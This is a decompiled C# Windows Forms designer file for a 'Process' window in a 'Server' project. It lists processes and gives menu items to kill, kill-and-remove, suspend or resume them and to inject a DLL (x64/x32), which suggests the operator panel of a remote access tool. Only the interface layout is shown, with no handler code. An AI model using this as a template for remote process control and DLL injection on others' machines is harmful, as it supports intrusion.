namespace Server.Forms
{
	// Token: 0x020000B6 RID: 182
	public partial class FormProcess : global::Server.Helper.FormMaterial
	{
		// Token: 0x060005BE RID: 1470 RVA: 0x00053160 File Offset: 0x00051360
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060005BF RID: 1471 RVA: 0x00053180 File Offset: 0x00051380
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Server.Forms.FormProcess));
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new global::System.Windows.Forms.DataGridViewCellStyle();
			this.timer1 = new global::System.Windows.Forms.Timer(this.components);
			this.contextMenuStrip1 = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.killToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.killRemoveToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.dToolStripMenuItem1 = new global::System.Windows.Forms.ToolStripSeparator();
			this.suspendProcessToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.resumeProcessToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.dToolStripMenuItem = new global::System.Windows.Forms.ToolStripSeparator();
			this.openDirectoryExplorerToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.panel1 = new global::System.Windows.Forms.Panel();
			this.materialLabel1 = new global::MaterialSkin.Controls.MaterialLabel();
			this.dataGridView2 = new global::System.Windows.Forms.DataGridView();
			this.Column4 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column3 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Column1 = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.dllInjectorToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.x64ToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.x32ToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.contextMenuStrip1.SuspendLayout();
			this.panel1.SuspendLayout();
			((global::System.ComponentModel.ISupportInitialize)this.dataGridView2).BeginInit();
			base.SuspendLayout();
			this.timer1.Interval = 1000;
			this.timer1.Tick += new global::System.EventHandler(this.timer1_Tick);
			this.contextMenuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.killToolStripMenuItem,
				this.killRemoveToolStripMenuItem,
				this.dllInjectorToolStripMenuItem,
				this.dToolStripMenuItem1,
				this.suspendProcessToolStripMenuItem,
				this.resumeProcessToolStripMenuItem,
				this.dToolStripMenuItem,
				this.openDirectoryExplorerToolStripMenuItem
			});
			this.contextMenuStrip1.Name = "contextMenuStrip1";
			this.contextMenuStrip1.Size = new global::System.Drawing.Size(201, 170);
			this.killToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("killToolStripMenuItem.Image");
			this.killToolStripMenuItem.Name = "killToolStripMenuItem";
			this.killToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.killToolStripMenuItem.Text = "Kill Process";
			this.killToolStripMenuItem.Click += new global::System.EventHandler(this.killToolStripMenuItem_Click);
			this.killRemoveToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("killRemoveToolStripMenuItem.Image");
			this.killRemoveToolStripMenuItem.Name = "killRemoveToolStripMenuItem";
			this.killRemoveToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.killRemoveToolStripMenuItem.Text = "Kill Process + Remove";
			this.killRemoveToolStripMenuItem.Click += new global::System.EventHandler(this.killRemoveToolStripMenuItem_Click);
			this.dToolStripMenuItem1.Name = "dToolStripMenuItem1";
			this.dToolStripMenuItem1.Size = new global::System.Drawing.Size(197, 6);
			this.suspendProcessToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("suspendProcessToolStripMenuItem.Image");
			this.suspendProcessToolStripMenuItem.Name = "suspendProcessToolStripMenuItem";
			this.suspendProcessToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.suspendProcessToolStripMenuItem.Text = "Suspend Process";
			this.suspendProcessToolStripMenuItem.Click += new global::System.EventHandler(this.suspendProcessToolStripMenuItem_Click);
			this.resumeProcessToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("resumeProcessToolStripMenuItem.Image");
			this.resumeProcessToolStripMenuItem.Name = "resumeProcessToolStripMenuItem";
			this.resumeProcessToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.resumeProcessToolStripMenuItem.Text = "Resume Process";
			this.resumeProcessToolStripMenuItem.Click += new global::System.EventHandler(this.resumeProcessToolStripMenuItem_Click);
			this.dToolStripMenuItem.Name = "dToolStripMenuItem";
			this.dToolStripMenuItem.Size = new global::System.Drawing.Size(197, 6);
			this.openDirectoryExplorerToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("openDirectoryExplorerToolStripMenuItem.Image");
			this.openDirectoryExplorerToolStripMenuItem.Name = "openDirectoryExplorerToolStripMenuItem";
			this.openDirectoryExplorerToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.openDirectoryExplorerToolStripMenuItem.Text = "Open Directory Explorer";
			this.openDirectoryExplorerToolStripMenuItem.Click += new global::System.EventHandler(this.openDirectoryExplorerToolStripMenuItem_Click);
			this.panel1.Controls.Add(this.materialLabel1);
			this.panel1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.panel1.Location = new global::System.Drawing.Point(3, 512);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(794, 20);
			this.panel1.TabIndex = 1;
			this.materialLabel1.AutoSize = true;
			this.materialLabel1.Depth = 0;
			this.materialLabel1.Font = new global::System.Drawing.Font("Roboto", 14f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Pixel);
			this.materialLabel1.Location = new global::System.Drawing.Point(2, 1);
			this.materialLabel1.MouseState = global::MaterialSkin.MouseState.HOVER;
			this.materialLabel1.Name = "materialLabel1";
			this.materialLabel1.Size = new global::System.Drawing.Size(94, 19);
			this.materialLabel1.TabIndex = 1;
			this.materialLabel1.Text = "Please wait...";
			this.dataGridView2.AllowDrop = true;
			this.dataGridView2.AllowUserToAddRows = false;
			this.dataGridView2.AllowUserToDeleteRows = false;
			this.dataGridView2.AllowUserToResizeColumns = false;
			this.dataGridView2.AllowUserToResizeRows = false;
			this.dataGridView2.BackgroundColor = global::System.Drawing.Color.White;
			this.dataGridView2.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.dataGridView2.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.None;
			this.dataGridView2.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
			dataGridViewCellStyle.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle.SelectionBackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle.SelectionForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
			this.dataGridView2.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.dataGridView2.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
			{
				this.Column4,
				this.Column3,
				this.Column1
			});
			this.dataGridView2.ContextMenuStrip = this.contextMenuStrip1;
			this.dataGridView2.Cursor = global::System.Windows.Forms.Cursors.Default;
			dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Arial", 9f);
			dataGridViewCellStyle2.ForeColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.Color.Purple;
			dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
			this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle2;
			this.dataGridView2.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.dataGridView2.Enabled = false;
			this.dataGridView2.EnableHeadersVisualStyles = false;
			this.dataGridView2.GridColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			this.dataGridView2.Location = new global::System.Drawing.Point(3, 64);
			this.dataGridView2.Name = "dataGridView2";
			this.dataGridView2.ReadOnly = true;
			this.dataGridView2.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle3.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle3.BackColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			dataGridViewCellStyle3.ForeColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle3.Padding = new global::System.Windows.Forms.Padding(1, 0, 0, 0);
			dataGridViewCellStyle3.SelectionBackColor = global::System.Drawing.Color.FromArgb(0, 192, 0);
			dataGridViewCellStyle3.SelectionForeColor = global::System.Drawing.Color.FromArgb(17, 17, 17);
			dataGridViewCellStyle3.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.dataGridView2.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
			this.dataGridView2.RowHeadersVisible = false;
			this.dataGridView2.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.dataGridView2.ShowCellErrors = false;
			this.dataGridView2.ShowCellToolTips = false;
			this.dataGridView2.ShowEditingIcon = false;
			this.dataGridView2.ShowRowErrors = false;
			this.dataGridView2.Size = new global::System.Drawing.Size(794, 448);
			this.dataGridView2.TabIndex = 17;
			this.Column4.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.Column4.HeaderText = "Name";
			this.Column4.MinimumWidth = 100;
			this.Column4.Name = "Column4";
			this.Column4.ReadOnly = true;
			this.Column3.HeaderText = "Pid";
			this.Column3.MinimumWidth = 80;
			this.Column3.Name = "Column3";
			this.Column3.ReadOnly = true;
			this.Column3.Width = 80;
			this.Column1.AutoSizeMode = global::System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
			this.Column1.HeaderText = "Path";
			this.Column1.MinimumWidth = 100;
			this.Column1.Name = "Column1";
			this.Column1.ReadOnly = true;
			this.dllInjectorToolStripMenuItem.DropDownItems.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.x64ToolStripMenuItem,
				this.x32ToolStripMenuItem
			});
			this.dllInjectorToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("dllInjectorToolStripMenuItem.Image");
			this.dllInjectorToolStripMenuItem.Name = "dllInjectorToolStripMenuItem";
			this.dllInjectorToolStripMenuItem.Size = new global::System.Drawing.Size(200, 22);
			this.dllInjectorToolStripMenuItem.Text = "Dll Injector";
			this.x64ToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("x64ToolStripMenuItem.Image");
			this.x64ToolStripMenuItem.Name = "x64ToolStripMenuItem";
			this.x64ToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.x64ToolStripMenuItem.Text = "X64";
			this.x64ToolStripMenuItem.Click += new global::System.EventHandler(this.x64ToolStripMenuItem_Click);
			this.x32ToolStripMenuItem.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("x32ToolStripMenuItem.Image");
			this.x32ToolStripMenuItem.Name = "x32ToolStripMenuItem";
			this.x32ToolStripMenuItem.Size = new global::System.Drawing.Size(180, 22);
			this.x32ToolStripMenuItem.Text = "X32";
			this.x32ToolStripMenuItem.Click += new global::System.EventHandler(this.x32ToolStripMenuItem_Click);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.White;
			base.ClientSize = new global::System.Drawing.Size(800, 535);
			base.Controls.Add(this.dataGridView2);
			base.Controls.Add(this.panel1);
			base.Name = "FormProcess";
			this.Text = "Process";
			base.Load += new global::System.EventHandler(this.FormProcess_Load);
			this.contextMenuStrip1.ResumeLayout(false);
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			((global::System.ComponentModel.ISupportInitialize)this.dataGridView2).EndInit();
			base.ResumeLayout(false);
		}

		// Token: 0x04000483 RID: 1155
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000484 RID: 1156
		private global::System.Windows.Forms.Timer timer1;

		// Token: 0x04000485 RID: 1157
		private global::System.Windows.Forms.ContextMenuStrip contextMenuStrip1;

		// Token: 0x04000486 RID: 1158
		private global::System.Windows.Forms.ToolStripMenuItem killToolStripMenuItem;

		// Token: 0x04000487 RID: 1159
		private global::System.Windows.Forms.ToolStripMenuItem killRemoveToolStripMenuItem;

		// Token: 0x04000488 RID: 1160
		private global::System.Windows.Forms.ToolStripMenuItem openDirectoryExplorerToolStripMenuItem;

		// Token: 0x04000489 RID: 1161
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x0400048A RID: 1162
		public global::System.Windows.Forms.DataGridView dataGridView2;

		// Token: 0x0400048B RID: 1163
		public global::MaterialSkin.Controls.MaterialLabel materialLabel1;

		// Token: 0x0400048C RID: 1164
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column4;

		// Token: 0x0400048D RID: 1165
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column3;

		// Token: 0x0400048E RID: 1166
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Column1;

		// Token: 0x0400048F RID: 1167
		private global::System.Windows.Forms.ToolStripMenuItem resumeProcessToolStripMenuItem;

		// Token: 0x04000490 RID: 1168
		private global::System.Windows.Forms.ToolStripMenuItem suspendProcessToolStripMenuItem;

		// Token: 0x04000491 RID: 1169
		private global::System.Windows.Forms.ToolStripSeparator dToolStripMenuItem1;

		// Token: 0x04000492 RID: 1170
		private global::System.Windows.Forms.ToolStripSeparator dToolStripMenuItem;

		// Token: 0x04000493 RID: 1171
		private global::System.Windows.Forms.ToolStripMenuItem dllInjectorToolStripMenuItem;

		// Token: 0x04000494 RID: 1172
		private global::System.Windows.Forms.ToolStripMenuItem x64ToolStripMenuItem;

		// Token: 0x04000495 RID: 1173
		private global::System.Windows.Forms.ToolStripMenuItem x32ToolStripMenuItem;
	}
}
